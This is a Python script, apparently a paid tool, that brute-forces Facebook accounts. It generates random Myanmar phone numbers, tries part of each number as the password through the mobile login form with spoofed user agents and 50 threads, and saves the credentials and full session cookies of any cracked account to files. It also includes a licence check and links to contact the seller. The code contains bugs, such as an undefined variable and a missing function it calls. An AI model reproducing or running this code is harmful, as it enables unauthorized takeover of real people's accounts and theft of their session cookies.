# Myimport os,sys,time,json,random,re,string,platform,base64,requests,mechanize,uuid
from concurrent.futures import ThreadPoolExecutor as speed
from requests.exceptions import ConnectionError

logo="""\033[1;37m=================================================
ooo        ooooo oooooo   oooo       .o.       ooooo      ooo ooo        ooooo       .o.       ooooooooo.        
`88.       .888'  `888.   .8'       .888.      `888b.     `8' `88.       .888'      .888.      `888   `Y88.      
 888b     d'888    `888. .8'       .8"888.      8 `88b.    8   888b     d'888      .8"888.      888   .d88'      
 8 Y88. .P  888     `888.8'       .8' `888.     8   `88b.  8   8 Y88. .P  888     .8' `888.     888ooo88P'       
 8  `888'   888      `888'       .88ooo8888.    8     `88b.8   8  `888'   888    .88ooo8888.    888`88b.         
 8    Y     888       888       .8'     `888.   8       `888   8    Y     888   .8'     `888.   888  `88b.       
o8o        o888o     o888o     o88o     o8888o o8o        `8  o8o        o888o o88o     o8888o o888o  o888o                                                                                                                                                                                                                                                                                                                                                   
=================================================
[*] Owner          :  Muhammad Kazim
[*] GitHub         :  UNKN0WN-009
[*] Status         :  Paid
[*] VerSion        :  v_0.1
================================================="""

def clear():
    os.system('clear')
    print(logo)

useragent=[]
for sex in range(5000):
    gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c=f' TL-tl; {str(gt)}'
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    agent=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
    useragent.append(agent)

loop = 0
okacc = []
cpacc = []

def Main_Menu():
    clear()
    print('[1] Random Number Cloning')
    print('[2] Contact with Owner')
    print('[3] Exit Main Menu')
    print(49*'=')
    xxx=input('[*] Select Option : ')
    if xxx in ('1','01'):
        myanmar_randm()
    if xxx in ('2','02'):
        os.system('xdg-open https://www.facebook.com/profile.php?id=100047397923568')
    if xxx in ('3','03'):
        exit('\t[*] Bye Bye [*]')
def myanmar_randm():
    user = []
    clear()
    print('[*] Example : 95925, 95967, 95977, 95996')
    print(49*'=')
    code = input('[*] Put Code : ')
    clear()
    print('[*] Example : 1000, 2000, 5000, 10000')
    print(49*'=')
    limit = int(input('[*] Put Limit : '))
    for nmbr in range(limit):
        nbr = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nbr)
    clear()
    with speed(max_workers=50) as crack:
        clear()
        total_ids = str(len(user))
        print('[*] Total ids : '+total_ids)
        print('[*] Process has been started')
        print('[*] Use flight mode for speed up')
        print('[*] Cp ids open after 15 days')
        print(49*'=')
        for love in user:
            ids = code+love
            passlist = [love]
            crack.submit(myanmar_randsub,ids,passlist,total_ids)
    print(49*'=')
    print('[*] Process has been completed')
    print('[*] Total OK/CP/2F '+str(len(okacc))+'/'+str(len(cpacc))+'/'+str(len(tfacc)))
    print('[*] Ok ids are saved in Ok.txt')
    print('[*] Cp ids are saved in Cp.txt')
    print(49*'=')
    input('[*] Press enter to back.')
    os.system('python random.py')
def myanmar_randsub(ids,passlist,total_ids):
    global loop
    global okacc
    global cpacc
    try:
        for pas in passlist:
            best = random.choice(useragent)
            session = requests.Session()
            mobile_fb = session.get('https://m.facebook.com').text
            url = 'https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8'
            payload = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(mobile_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(mobile_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(mobile_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(mobile_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            header_mobile_fb = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'referer': 'https://m.facebook.com/',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
            }
            lo = session.post(url,data=payload,headers=header_mobile_fb)
            login_cookies=session.cookies.get_dict().keys()
            if 'c_user' in login_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f'\r\033[1;32m[MYA-OK] {cid} | {pas}\r')
                open('Ok.txt', 'a').write(f'[MYA-OK] {cid} | {pas}\n')
                open('cookies.txt', 'a').write(f'COOKIES ~> {coki}\n')
                okacc.append(cid)
                break
            elif 'checkpoint' in login_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print(f'\r\033[1;35m[MYA-CP] {cid} | {pas}\r')
                open('Cp.txt', 'a').write(f'[MYA-CP] {cid} | {pas}\n')
                cpacc.append(cid)
                break
            else:
                continue
        loop=+1
        sys.stdout.write('\r\033[1;37m[MYA-XD] [%s/%s] [OK:%s] [CP:%s] [2F:%s]\r'%(loop,total_ids,len(okacc),len(cpacc),len(tfacc)))
        sys.stdout.flush()
    except ConnectionError:
        exit('[*] Internet Connection Error')
    except:
        pass
def approve():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = ":".join(uuid)
  try:
    keyxhk = requests.get('https://github.com/Mr-Kazim/Random-Test/blob/main/approve.txt').text
    if id in keyxhk:
      os.system('clear')
      print(logo)
      print("\033[1;32m[*] CONGRATS! YOUR KEY IS APPROVED.")
      msg = str(os.geteuid())
      Main()
      pass
    else:
      os.system('clear')
      print(logo)
      print('\033[1;37m[*] Your Key       : \033[1;32m'+id)
      linex()
      print('\033[1;37m[*] Hello Dear! This tool is free.')
      print('[*] But You need to get approve first.')
      linex()
      input('[*] Press enter to Contact.')
      linex()
      txxt = ('Hello%20Sir!%20Please%20approve%20my%20token.%20My%20token%20is%20:%20'+id)
      os.system('xdg-open https://wa.me/+959253141103?text='+txxt)
      approve()
  except ConnectionError:
    exit('\t[*] Internet Connection Error [*]')
Main_Menu()
